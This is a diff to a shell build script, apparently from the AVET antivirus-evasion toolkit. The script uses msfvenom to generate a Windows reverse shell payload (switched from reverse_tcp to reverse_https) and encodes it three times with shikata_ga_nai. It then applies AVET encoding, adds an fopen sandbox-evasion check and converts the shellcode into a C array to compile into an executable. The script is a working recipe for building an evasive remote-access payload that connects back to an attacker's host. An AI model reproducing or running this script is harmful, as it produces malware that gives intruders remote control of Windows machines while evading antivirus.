@@ -18,16 +18,19 @@ LHOST=$GLOBAL_LHOST
 
 # make shell tcp reverse payload, encoded with shikata_ga_nai
 # additionaly to the avet encoder, further encoding should be used
-msfvenom -p windows/shell/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > input/sc.txt
+msfvenom -p windows/shell/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > input/sc_c.txt
 
-# Apply AVET encoding via format.sh tool
-./tools/format.sh input/sc.txt > input/scclean.txt
+# Apply AVET encoding
+encode_shellcode input/sc_c.txt input/scenc_raw.txt
 
 # add fopen sandbox evasion technique
 add_evasion fopen_sandbox_evasion
 
+# format into c array for static include
+./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
+
 # set shellcode source
- set_shellcode_source static_from_file input/sc.txt
+set_shellcode_source static_from_file input/scenc_c.txt
 
 # set decoder and key source
 # AVET decoder requires no key
